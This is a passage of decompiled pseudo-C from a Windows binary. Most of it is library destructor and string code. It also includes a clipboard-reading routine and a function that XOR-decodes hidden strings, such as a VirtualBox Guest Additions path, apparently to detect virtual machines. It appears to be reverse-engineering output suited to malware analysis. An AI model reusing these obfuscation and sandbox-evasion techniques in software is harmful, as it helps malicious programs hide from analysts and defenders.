       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)pvVar2)))) goto LAB_140005f79;
    free(pvVar2);
    *(undefined8 *)(param_1 + 0x28) = 0;
    *(undefined8 *)(param_1 + 0x30) = 0;
    *(undefined8 *)(param_1 + 0x38) = 0;
  }
  pvVar1 = *(void **)(param_1 + 8);
  if (pvVar1 != (void *)0x0) {
    pvVar2 = pvVar1;
    if ((0xfff < (*(longlong *)(param_1 + 0x18) - (longlong)pvVar1 & 0xfffffffffffffffcU)) &&
       (pvVar2 = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)pvVar2)))) {
LAB_140005f79:
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(pvVar2);
    *(undefined8 *)(param_1 + 8) = 0;
    *(undefined8 *)(param_1 + 0x10) = 0;
    *(undefined8 *)(param_1 + 0x18) = 0;
  }
  return;
}



void FUN_140005f98(longlong **param_1)

{
  void **ppvVar1;
  void *pvVar2;
  void *_Memory;
  
  ppvVar1 = (void **)*param_1;
  if ((ppvVar1 != (void **)0x0) && (pvVar2 = *ppvVar1, pvVar2 != (void *)0x0)) {
    _Memory = pvVar2;
    if ((0xfff < ((longlong)ppvVar1[2] - (longlong)pvVar2 & 0xfffffffffffffffcU)) &&
       (_Memory = *(void **)((longlong)pvVar2 + -8),
       0x1f < (ulonglong)((longlong)pvVar2 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
    *ppvVar1 = (void *)0x0;
    ppvVar1[1] = (void *)0x0;
    ppvVar1[2] = (void *)0x0;
  }
  return;
}



void FUN_140005ffc(undefined8 *param_1)

{
  if ((longlong **)*param_1 != (longlong **)0x0) {
    FUN_14000b64c((longlong **)*param_1);
  }
  return;
}



void FUN_140006014(longlong **param_1)

{
  void **ppvVar1;
  void *pvVar2;
  void *_Memory;
  
  ppvVar1 = (void **)*param_1;
  if ((ppvVar1 != (void **)0x0) && (pvVar2 = *ppvVar1, pvVar2 != (void *)0x0)) {
    _Memory = pvVar2;
    if ((0xfff < ((longlong)ppvVar1[2] - (longlong)pvVar2 & 0xfffffffffffffff0U)) &&
       (_Memory = *(void **)((longlong)pvVar2 + -8),
       0x1f < (ulonglong)((longlong)pvVar2 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
    *ppvVar1 = (void *)0x0;
    ppvVar1[1] = (void *)0x0;
    ppvVar1[2] = (void *)0x0;
  }
  return;
}



void FUN_140006078(longlong **param_1)

{
  longlong *plVar1;
  longlong *plVar2;
  
  plVar1 = param_1[1];
  for (plVar2 = *param_1; plVar2 != plVar1; plVar2 = plVar2 + 9) {
    FUN_140006268(plVar2);
  }
  return;
}



void FUN_1400060a8(void **param_1)

{
  void *pvVar1;
  void *_Memory;
  
  pvVar1 = *param_1;
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < ((longlong)param_1[2] - (longlong)pvVar1 & 0xfffffffffffffffcU)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
    *param_1 = (void *)0x0;
    param_1[1] = (void *)0x0;
    param_1[2] = (void *)0x0;
  }
  return;
}



void FUN_140006108(longlong *param_1)

{
  int *piVar1;
  int iVar2;
  undefined8 *puVar3;
  undefined8 *puVar4;
  
  if (*param_1 != 0) {
    LOCK();
    piVar1 = (int *)(*param_1 + 0x2c);
    iVar2 = *piVar1;
    *piVar1 = *piVar1 + -1;
    if (iVar2 == 1) {
      puVar4 = (undefined8 *)*param_1;
      while (puVar4 != (undefined8 *)0x0) {
        puVar3 = (undefined8 *)puVar4[2];
        puVar4[2] = 0;
        (**(code **)*puVar4)(puVar4,1);
        puVar4 = puVar3;
      }
    }
  }
  *param_1 = 0;
  if ((longlong *)param_1[4] != (longlong *)0x0) {
    puVar4 = (undefined8 *)(**(code **)(*(longlong *)param_1[4] + 0x10))();
    if (puVar4 != (undefined8 *)0x0) {
      (**(code **)*puVar4)(puVar4,1);
    }
  }
  return;
}



void FUN_140006180(void **param_1)

{
  void *pvVar1;
  void *_Memory;
  
  if ((void *)0xf < param_1[3]) {
    pvVar1 = *param_1;
    _Memory = pvVar1;
    if ((0xfff < (longlong)param_1[3] + 1U) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  param_1[2] = (void *)0x0;
  param_1[3] = (void *)0xf;
  *(undefined *)param_1 = 0;
  return;
}



void thunk_FUN_14000b774(void **param_1)

{
  void *pvVar1;
  void *_Memory;
  
  if ((void *)0x7 < param_1[3]) {
    pvVar1 = *param_1;
    _Memory = pvVar1;
    if ((0xfff < (longlong)param_1[3] * 2 + 2U) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  param_1[3] = (void *)0x7;
  param_1[2] = (void *)0x0;
  *(undefined2 *)param_1 = 0;
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void FUN_1400061e4(longlong param_1)

{
  undefined8 *this;
  int iVar1;
  
  this = (undefined8 *)(param_1 + -0x80);
  *(undefined ***)((longlong)*(int *)(*(longlong *)(param_1 + -0x98) + 4) + -0x98 + param_1) =
       std::basic_stringstream<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
       vftable;
  iVar1 = *(int *)(*(longlong *)(param_1 + -0x98) + 4);
  *(int *)((longlong)iVar1 + -0x9c + param_1) = iVar1 + -0x98;
  *this = std::basic_stringbuf<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
          vftable;
  FUN_14000b5a0((longlong)this);
  std::basic_streambuf<char,struct_std::char_traits<char>_>::
  _basic_streambuf_char_struct_std__char_traits_char___
            ((basic_streambuf_char_struct_std__char_traits_char___ *)this);
                    // WARNING: Could not recover jumptable at 0x000140006252. Too many branches
                    // WARNING: Treating indirect jump as call
  std::basic_iostream<char,struct_std::char_traits<char>_>::
  _basic_iostream_char_struct_std__char_traits_char___(param_1 + -0x78);
  return;
}



void FUN_140006268(longlong *param_1)

{
  void *pvVar1;
  void *_Memory;
  
  if (0xf < (ulonglong)param_1[8]) {
    pvVar1 = (void *)param_1[5];
    _Memory = pvVar1;
    if ((0xfff < param_1[8] + 1U) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  param_1[7] = 0;
  param_1[8] = 0xf;
  *(undefined *)(param_1 + 5) = 0;
  FUN_140006108(param_1);
  return;
}



void FUN_1400062d0(longlong param_1)

{
  undefined8 *puVar1;
  
  if (*(longlong **)(param_1 + 0x18) != (longlong *)0x0) {
    puVar1 = (undefined8 *)(**(code **)(**(longlong **)(param_1 + 0x18) + 0x10))();
    if (puVar1 != (undefined8 *)0x0) {
      (**(code **)*puVar1)(puVar1,1);
    }
  }
  return;
}



void FUN_140006318(void **param_1)

{
  void *pvVar1;
  void *_Memory;
  
  pvVar1 = *param_1;
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < (ulonglong)((longlong)param_1[2] - (longlong)pvVar1)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
    *param_1 = (void *)0x0;
    param_1[1] = (void *)0x0;
    param_1[2] = (void *)0x0;
  }
  return;
}



void FUN_140006374(void **param_1)

{
  void *pvVar1;
  void *_Memory;
  
  pvVar1 = *param_1;
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < ((longlong)param_1[2] - (longlong)pvVar1 & 0xfffffffffffffff0U)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
    *param_1 = (void *)0x0;
    param_1[1] = (void *)0x0;
    param_1[2] = (void *)0x0;
  }
  return;
}



void FUN_1400063d4(undefined8 *param_1)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  undefined8 *puVar3;
  undefined8 *puVar4;
  
  *param_1 = std::_Node_if::vftable;
  puVar3 = (undefined8 *)param_1[5];
  while (puVar3 != (undefined8 *)0x0) {
    puVar1 = (undefined8 *)puVar3[5];
    puVar3[5] = 0;
    puVar2 = (undefined8 *)param_1[4];
    puVar4 = puVar3;
    while ((puVar3 = puVar1, puVar4 != puVar2 && (puVar4 != (undefined8 *)0x0))) {
      puVar3 = (undefined8 *)puVar4[2];
      puVar4[2] = 0;
      (**(code **)*puVar4)(puVar4,1);
      puVar4 = puVar3;
    }
  }
  *param_1 = std::_Node_base::vftable;
  return;
}



void FUN_140006458(longlong **param_1)

{
  longlong *plVar1;
  
  plVar1 = *(longlong **)((longlong)*(int *)(**param_1 + 4) + 0x48 + (longlong)*param_1);
  if (plVar1 != (longlong *)0x0) {
    (**(code **)(*plVar1 + 0x10))();
  }
  return;
}



void FUN_140006498(undefined8 *param_1)

{
  void *pvVar1;
  void *_Memory;
  
  if (0xf < (ulonglong)param_1[0x10]) {
    pvVar1 = (void *)param_1[0xd];
    _Memory = pvVar1;
    if ((0xfff < param_1[0x10] + 1) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  param_1[0xf] = 0;
  param_1[0x10] = 0xf;
  *(undefined *)(param_1 + 0xd) = 0;
  FUN_14000b774((void **)(param_1 + 9));
  FUN_14000b774((void **)(param_1 + 5));
  *param_1 = std::exception::vftable;
  __std_exception_destroy(param_1 + 1);
  return;
}



void FUN_14000654c(longlong **param_1)

{
  longlong *plVar1;
  bool bVar2;
  
  bVar2 = std::uncaught_exception();
  if (!bVar2) {
    std::basic_ostream<char,struct_std::char_traits<char>_>::_Osfx
              ((basic_ostream_char_struct_std__char_traits_char___ *)*param_1);
  }
  plVar1 = *(longlong **)((longlong)*(int *)(**param_1 + 4) + 0x48 + (longlong)*param_1);
  if (plVar1 != (longlong *)0x0) {
    (**(code **)(*plVar1 + 0x10))();
  }
  return;
}



undefined8 * FUN_14000658c(undefined8 *param_1,undefined8 *param_2)

{
  void **ppvVar1;
  
  ppvVar1 = (void **)(param_2 + 1);
  *param_1 = *param_2;
  if ((void **)(param_1 + 1) != ppvVar1) {
    FUN_140001aac((void **)(param_1 + 1),*ppvVar1,param_2[2] - (longlong)*ppvVar1 >> 2);
    param_1[4] = param_2[4];
  }
  ppvVar1 = (void **)(param_2 + 5);
  if ((void **)(param_1 + 5) != ppvVar1) {
    FUN_140001b48((void **)(param_1 + 5),*ppvVar1,param_2[6] - (longlong)*ppvVar1 >> 4);
  }
  return param_1;
}



ulonglong FUN_140006610(uint **param_1,uint param_2)

{
  char cVar1;
  uint uVar2;
  uint uVar3;
  ulonglong uVar4;
  
  do {
    uVar3 = 0;
    uVar4 = 0;
    if (param_2 != 1) {
      do {
        cVar1 = *(char *)(param_1 + 1);
        do {
          uVar2 = FUN_1400066a0(*param_1);
        } while (*(uint *)(param_1 + 2) <= uVar2 && uVar2 != *(uint *)(param_1 + 2));
        uVar3 = (uVar3 << (cVar1 - 1U & 0x1f)) * 2 | uVar2;
        uVar2 = ((int)uVar4 << (*(char *)(param_1 + 1) - 1U & 0x1f)) * 2 | *(uint *)(param_1 + 2);
        uVar4 = (ulonglong)uVar2;
      } while (uVar2 < param_2 - 1);
    }
  } while (((uint)(uVar4 / param_2) <= uVar3 / param_2) &&
          ((uint)(uVar4 % (ulonglong)param_2) != param_2 - 1));
  return (ulonglong)uVar3 % (ulonglong)param_2;
}



uint FUN_1400066a0(uint *param_1)

{
  uint uVar1;
  uint *puVar2;
  longlong lVar3;
  
  lVar3 = 0x270;
  if (*param_1 == 0x270) {
    puVar2 = param_1 + 2;
    do {
      uVar1 = (puVar2[-1] ^ *puVar2) & 0x7fffffff ^ puVar2[-1];
      puVar2[0x26f] = -(uint)((uVar1 & 1) != 0) & 0x9908b0df ^ puVar2[0x18c] ^ uVar1 >> 1;
      lVar3 = lVar3 + -1;
      puVar2 = puVar2 + 1;
    } while (lVar3 != 0);
  }
  else if (0x4df < *param_1) {
    FUN_14000b094(param_1);
  }
  uVar1 = param_1[(ulonglong)*param_1 + 1];
  *param_1 = *param_1 + 1;
  uVar1 = uVar1 ^ param_1[0x4e1] & uVar1 >> 0xb;
  uVar1 = uVar1 ^ (uVar1 & 0xff3a58ad) << 7;
  uVar1 = uVar1 ^ (uVar1 & 0xffffdf8c) << 0xf;
  return uVar1 >> 0x12 ^ uVar1;
}



void ** FUN_140006740(void **param_1,void **param_2,void *param_3)

{
  short *psVar1;
  void **ppvVar2;
  code *pcVar3;
  ulonglong uVar4;
  short *psVar5;
  void **ppvVar6;
  void **ppvVar7;
  void *pvVar8;
  void **ppvVar9;
  void *pvVar10;
  longlong lVar11;
  
  uVar4 = FUN_14000c588(param_2);
  if ((char)uVar4 != '\0') {
LAB_140006807:
    if (param_1 == param_2) {
      return param_1;
    }
    ppvVar7 = param_2 + 2;
    if ((void *)0x7 < param_2[3]) {
      param_2 = (void **)*param_2;
    }
    FID_conflict_assign(param_1,param_2,*ppvVar7);
    return param_1;
  }
  ppvVar7 = param_1;
  if ((void *)0x7 < param_1[3]) {
    ppvVar7 = (void **)*param_1;
  }
  psVar1 = (short *)((longlong)ppvVar7 + (longlong)param_1[2] * 2);
  ppvVar9 = param_2;
  if ((void *)0x7 < param_2[3]) {
    ppvVar9 = (void **)*param_2;
  }
  ppvVar2 = (void **)((longlong)ppvVar9 + (longlong)param_2[2] * 2);
  psVar5 = FUN_140009e54((short *)ppvVar7,psVar1);
  ppvVar6 = (void **)FUN_140009e54((short *)ppvVar9,(short *)ppvVar2);
  pvVar8 = (void *)((longlong)psVar5 - (longlong)ppvVar7 >> 1);
  if (ppvVar9 != ppvVar6) {
    param_3 = (void *)((longlong)ppvVar6 - (longlong)ppvVar9 >> 1);
    pvVar10 = pvVar8;
    if (param_3 < pvVar8) {
      pvVar10 = param_3;
    }
    if (pvVar10 != (void *)0x0) {
      lVar11 = (longlong)ppvVar7 - (longlong)ppvVar9;
      do {
        if (*(short *)(lVar11 + (longlong)ppvVar9) != *(short *)ppvVar9) goto LAB_140006807;
        ppvVar9 = (void **)((longlong)ppvVar9 + 2);
        pvVar10 = (void *)((longlong)pvVar10 + -1);
      } while (pvVar10 != (void *)0x0);
    }
    if ((pvVar8 < param_3) || (param_3 < pvVar8)) goto LAB_140006807;
  }
  if ((ppvVar6 == ppvVar2) || ((*(short *)ppvVar6 != 0x5c && (*(short *)ppvVar6 != 0x2f)))) {
    if (psVar5 == psVar1) {
      if ((longlong)pvVar8 < 3) goto LAB_1400068bf;
    }
    else if ((psVar1[-1] == 0x5c) || (psVar1[-1] == 0x2f)) goto LAB_1400068bf;
    pvVar8 = param_1[2];
    if (pvVar8 < param_1[3]) {
      param_1[2] = (void *)((longlong)pvVar8 + 1);
      ppvVar7 = param_1;
      if ((void *)0x7 < param_1[3]) {
        ppvVar7 = (void **)*param_1;
      }
      *(undefined4 *)((longlong)ppvVar7 + (longlong)pvVar8 * 2) = 0x5c;
    }
    else {
      FUN_14000372c(param_1,1,(ulonglong)param_3 & 0xffffffffffffff00,0x5c);
    }
  }
  else {
    if (param_1[2] < pvVar8) {
      FUN_14000ba88();
      pcVar3 = (code *)swi(3);
      ppvVar7 = (void **)(*pcVar3)();
      return ppvVar7;
    }
    ppvVar7 = param_1;
    if ((void *)0x7 < param_1[3]) {
      ppvVar7 = (void **)*param_1;
    }
    param_1[2] = pvVar8;
    *(undefined2 *)((longlong)ppvVar7 + (longlong)pvVar8 * 2) = 0;
  }
LAB_1400068bf:
  FID_conflict_append(param_1,ppvVar6,(longlong)ppvVar2 - (longlong)ppvVar6 >> 1);
  return param_1;
}



basic_ios_char_struct_std__char_traits_char___ * FUN_1400068fc(longlong param_1,uint param_2)

{
  basic_ios_char_struct_std__char_traits_char___ *this;
  
  this = (basic_ios_char_struct_std__char_traits_char___ *)(param_1 - *(int *)(param_1 + -4));
  FUN_1400061e4((longlong)this);
  std::basic_ios<char,struct_std::char_traits<char>_>::
  _basic_ios_char_struct_std__char_traits_char___(this);
  if ((param_2 & 1) != 0) {
    free(this + -0x98);
  }
  return this + -0x98;
}



undefined8 * FUN_140006908(undefined8 *param_1,uint param_2)

{
  FUN_140005d98(param_1);
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



undefined8 * FUN_14000693c(undefined8 *param_1,ulonglong param_2)

{
  free((void *)param_1[5]);
  *param_1 = std::_Node_base::vftable;
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



void ** FUN_140006980(void **param_1,uint param_2)

{
  void *pvVar1;
  void *_Memory;
  
  if ((void *)0xf < param_1[3]) {
    pvVar1 = *param_1;
    _Memory = pvVar1;
    if ((0xfff < (longlong)param_1[3] + 1U) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  param_1[2] = (void *)0x0;
  param_1[3] = (void *)0xf;
  *(undefined *)param_1 = 0;
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



undefined8 * FUN_140006a00(undefined8 *param_1,uint param_2)

{
  *param_1 = std::basic_stringbuf<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
             vftable;
  FUN_14000b5a0((longlong)param_1);
  std::basic_streambuf<char,struct_std::char_traits<char>_>::
  _basic_streambuf_char_struct_std__char_traits_char___
            ((basic_streambuf_char_struct_std__char_traits_char___ *)param_1);
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



undefined8 * FUN_140006a98(undefined8 *param_1,uint param_2)

{
  *param_1 = std::collate<char>::vftable;
  free((void *)param_1[3]);
  std::locale::facet::_facet((facet *)param_1);
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



void * FUN_140006ae4(void *param_1,ulonglong param_2)

{
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



undefined8 * FUN_140006b08(undefined8 *param_1,uint param_2)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  *param_1 = std::_Node_assert::vftable;
  puVar2 = (undefined8 *)param_1[4];
  while (puVar2 != (undefined8 *)0x0) {
    puVar1 = (undefined8 *)puVar2[2];
    puVar2[2] = 0;
    (**(code **)*puVar2)(puVar2,1);
    puVar2 = puVar1;
  }
  *param_1 = std::_Node_base::vftable;
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



undefined8 * FUN_140006b78(undefined8 *param_1,ulonglong param_2)

{
  *param_1 = std::_Node_base::vftable;
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



undefined8 * FUN_140006ba4(undefined8 *param_1,ulonglong param_2)

{
  *param_1 = std::_Node_base::vftable;
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



undefined8 * FUN_140006bd0(undefined8 *param_1,uint param_2)

{
  FUN_1400063d4(param_1);
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



undefined8 * FUN_140006c04(undefined8 *param_1,ulonglong param_2)

{
  *param_1 = std::_Node_base::vftable;
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



undefined8 * FUN_140006c30(undefined8 *param_1,ulonglong param_2)

{
  *param_1 = std::_Node_base::vftable;
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



undefined8 * FUN_140006c5c(undefined8 *param_1,ulonglong param_2)

{
  *param_1 = std::exception::vftable;
  __std_exception_destroy(param_1 + 1);
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



undefined8 * FUN_140006ca0(undefined8 *param_1,ulonglong param_2)

{
  *param_1 = std::exception::vftable;
  __std_exception_destroy(param_1 + 1);
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



undefined8 * FUN_140006ce4(undefined8 *param_1,uint param_2)

{
  FUN_140006498(param_1);
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



void FUN_140006d18(undefined (*param_1) [16])

{
  HANDLE pvVar1;
  undefined *puVar2;
  undefined auStack104 [40];
  undefined (*local_40) [16];
  undefined local_38 [16];
  undefined local_28 [16];
  ulonglong local_18;
  
  local_18 = DAT_140017038 ^ (ulonglong)auStack104;
  local_40 = param_1;
  pvVar1 = GetClipboardData(1);
  if (pvVar1 == (HANDLE)0x0) {
    param_1[2][0] = 0;
  }
  else {
    local_38 = ZEXT816(0);
    puVar2 = (undefined *)0xffffffffffffffff;
    local_28 = ZEXT816(0);
    do {
      puVar2 = puVar2 + 1;
    } while (*(char *)((longlong)pvVar1 + (longlong)puVar2) != '\0');
    FUN_140001d68((void **)local_38,pvVar1,puVar2);
    *param_1 = ZEXT816(0);
    *(undefined8 *)param_1[1] = 0;
    *(undefined8 *)(param_1[1] + 8) = 0;
    memcpy(param_1,local_38,0x20);
    param_1[2][0] = 1;
  }
  FUN_14000eed0(local_18 ^ (ulonglong)auStack104);
  return;
}



// WARNING: Removing unreachable block (ram,0x00014000758c)
// WARNING: Could not reconcile some variable overlaps

void FUN_140006db4(void)

{
  byte *pbVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  bool bVar5;
  bool bVar6;
  bool bVar7;
  bool bVar8;
  bool bVar9;
  bool bVar10;
  bool bVar11;
  bool bVar12;
  bool bVar13;
  uint uVar14;
  LSTATUS LVar15;
  ulonglong uVar16;
  ulonglong uVar17;
  undefined auStackY1144 [32];
  longlong local_448;
  undefined8 local_440;
  HKEY local_438;
  undefined8 local_430;
  undefined8 uStack1064;
  undefined8 local_420;
  undefined8 uStack1048;
  undefined4 local_410;
  undefined4 local_40c;
  undefined4 local_408;
  undefined8 local_400;
  undefined8 uStack1016;
  undefined8 local_3f0;
  undefined8 uStack1000;
  uint local_3e0;
  undefined4 local_3d8;
  undefined4 uStack980;
  undefined4 uStack976;
  undefined4 uStack972;
  undefined4 local_3c8;
  undefined4 uStack964;
  undefined4 uStack960;
  undefined4 uStack956;
  undefined4 local_3b8;
  undefined4 local_3b4;
  undefined4 local_3b0;
  undefined local_3ac;
  undefined4 local_3a8;
  undefined4 uStack932;
  undefined4 uStack928;
  undefined4 uStack924;
  undefined4 local_398;
  undefined4 uStack916;
  undefined4 uStack912;
  undefined4 uStack908;
  undefined4 local_388;
  undefined4 local_384;
  undefined2 local_380;
  undefined local_37e;
  undefined4 local_378;
  undefined4 uStack884;
  undefined4 uStack880;
  undefined4 uStack876;
  undefined4 local_368;
  undefined4 uStack868;
  undefined4 uStack864;
  undefined4 uStack860;
  undefined4 local_358;
  undefined4 local_354;
  ushort local_350;
  undefined4 local_348;
  undefined4 uStack836;
  undefined4 uStack832;
  undefined4 uStack828;
  undefined4 local_338;
  undefined4 uStack820;
  undefined4 uStack816;
  undefined4 uStack812;
  undefined4 local_328;
  undefined4 local_324;
  undefined local_320;
  undefined4 local_318;
  undefined4 uStack788;
  undefined4 uStack784;
  undefined4 uStack780;
  undefined4 local_308;
  undefined4 uStack772;
  undefined4 uStack768;
  undefined4 uStack764;
  undefined4 local_2f8;
  undefined4 local_2f4;
  undefined local_2f0;
  undefined4 local_2e8;
  undefined4 uStack740;
  undefined4 uStack736;
  undefined4 uStack732;
  undefined4 local_2d8;
  undefined4 uStack724;
  undefined4 uStack720;
  undefined4 uStack716;
  undefined4 local_2c8;
  uint local_2c4;
  undefined4 local_2c0;
  undefined4 uStack700;
  undefined4 uStack696;
  undefined4 uStack692;
  undefined4 local_2b0;
  undefined4 uStack684;
  undefined4 uStack680;
  undefined4 uStack676;
  undefined4 local_2a0;
  uint local_29c;
  undefined4 local_298;
  undefined4 uStack660;
  undefined4 uStack656;
  undefined4 uStack652;
  undefined4 local_288;
  undefined4 uStack644;
  undefined4 uStack640;
  undefined4 uStack636;
  undefined4 local_278;
  uint local_274;
  undefined4 local_270;
  undefined4 uStack620;
  undefined4 uStack616;
  undefined4 uStack612;
  undefined4 local_260;
  undefined4 uStack604;
  undefined4 uStack600;
  undefined4 uStack596;
  undefined4 local_250;
  ushort local_24c;
  undefined4 local_248;
  undefined4 uStack580;
  undefined4 uStack576;
  undefined4 uStack572;
  undefined4 local_238;
  undefined4 uStack564;
  undefined4 uStack560;
  undefined4 uStack556;
  undefined4 local_228;
  undefined4 uStack548;
  undefined4 uStack544;
  undefined4 uStack540;
  undefined2 local_218;
  undefined local_216;
  undefined4 local_208;
  undefined4 uStack516;
  undefined4 uStack512;
  undefined4 uStack508;
  undefined4 local_1f8;
  undefined4 uStack500;
  undefined4 uStack496;
  undefined4 uStack492;
  undefined4 local_1e8;
  undefined4 uStack484;
  undefined4 uStack480;
  undefined4 uStack476;
  undefined4 local_1d8;
  undefined4 uStack468;
  undefined4 uStack464;
  undefined4 uStack460;
  uint local_1c8;
  void *local_1b8 [4];
  void *local_198 [4];
  void *local_178 [4];
  void *local_158 [4];
  void *local_138 [4];
  void *local_118 [4];
  void *local_f8 [4];
  void *local_d8 [4];
  void *local_b8 [4];
  void *local_98 [4];
  void *local_78 [4];
  void *local_58 [4];
  void *local_38 [4];
  ulonglong local_18;
  
  local_18 = DAT_140017038 ^ (ulonglong)auStackY1144;
  uVar17 = 0;
  local_208 = 0x482e5714;
  uStack516 = 0x737b6644;
  uStack512 = 0x34797566;
  uStack508 = 0x71787d52;
  local_1f8 = 0x665b4867;
  uStack500 = 0x71787775;
  uStack496 = 0x667d4248;
  uStack492 = 0x78756160;
  local_1e8 = 0x346c7b56;
  uStack484 = 0x67716153;
  uStack480 = 0x70553460;
  uStack476 = 0x7d607d70;
  local_1d8 = 0x48677a7b;
  uStack468 = 0x6c7b5642;
  uStack464 = 0x607a7b57;
  uStack460 = 0x3a787b66;
  local_1c8 = 0x716c71;
  bVar13 = false;
  bVar12 = false;
  bVar11 = false;
  bVar10 = false;
  bVar9 = false;
  bVar8 = false;
  bVar6 = false;
  bVar5 = false;
  bVar4 = false;
  bVar3 = false;
  bVar2 = false;
  uVar16 = uVar17;
  do {
    pbVar1 = (byte *)((longlong)&local_208 + uVar16 + 1);
    *pbVar1 = *pbVar1 ^ 0x14;
    uVar16 = uVar16 + 1;
  } while (uVar16 < 0x42);
  local_1c8 = local_1c8 & 0xffffff;
  local_440 = (longlong)&local_208 + 1;
  FUN_1400023e8((undefined (*) [16])local_38,&local_440);
  local_440._0_4_ = 1;
  uVar16 = FUN_14000c3ec(local_38);
  if ((char)uVar16 == '\0') {
    local_248 = 0x2b4d3477;
    uStack580 = 0x10180527;
    uStack576 = 0x571a1605;
    uStack572 = 0x121b1e31;
    local_238 = 0x3a212b04;
    uStack564 = 0x12051600;
    uStack560 = 0x3a212b;
    uStack556 = 0x57120516;
    local_228 = 0x1b181823;
    uStack548 = 0x1a012b04;
    uStack544 = 0x1b181803;
    uStack540 = 0x12591304;
    local_218 = 0x120f;
    uVar16 = uVar17;
    do {
      pbVar1 = (byte *)((longlong)&local_248 + uVar16 + 1);
      *pbVar1 = *pbVar1 ^ 0x77;
      uVar16 = uVar16 + 1;
    } while (uVar16 < 0x31);
    local_216 = 0;
    local_448 = (longlong)&local_248 + 1;
    FUN_1400023e8((undefined (*) [16])local_58,&local_448);
    bVar13 = true;
    bVar12 = false;
    bVar11 = false;
    bVar10 = false;
    bVar9 = false;
    bVar8 = false;
    bVar6 = false;
    bVar5 = false;
    bVar4 = false;
    bVar3 = false;
    bVar2 = false;
    local_440._0_4_ = 3;
    uVar16 = FUN_14000c3ec(local_58);
    uVar14 = local_3e0;
    if ((char)uVar16 != '\0') goto LAB_140007512;
    local_400 = 0x50f08363d5b2261;
    uStack1016 = 0x151218123d12160e;
    local_3f0 = 0x60c173d53520c04;
    uStack1000 = 0xd0d054f15120414;
    local_3e0 = local_3e0 & 0xffffff00;
    uVar16 = uVar17;
    do {
      pbVar1 = (byte *)((longlong)&local_400 + uVar16 + 1);
      *pbVar1 = *pbVar1 ^ 0x61;
      uVar16 = uVar16 + 1;
    } while (uVar16 < 0x1f);
    local_3e0 = uVar14 & 0xffffff00;
    local_448 = (longlong)&local_400 + 1;
    FUN_1400023e8((undefined (*) [16])local_78,&local_448);
    bVar13 = true;
    bVar12 = true;
    bVar11 = false;
    bVar10 = false;
    bVar9 = false;
    bVar8 = false;
    bVar6 = false;
    bVar5 = false;
    bVar4 = false;
    bVar3 = false;
    bVar2 = false;
    local_440._0_4_ = 7;
    uVar16 = FUN_14000c3ec(local_78);
    if ((char)uVar16 != '\0') goto LAB_140007512;
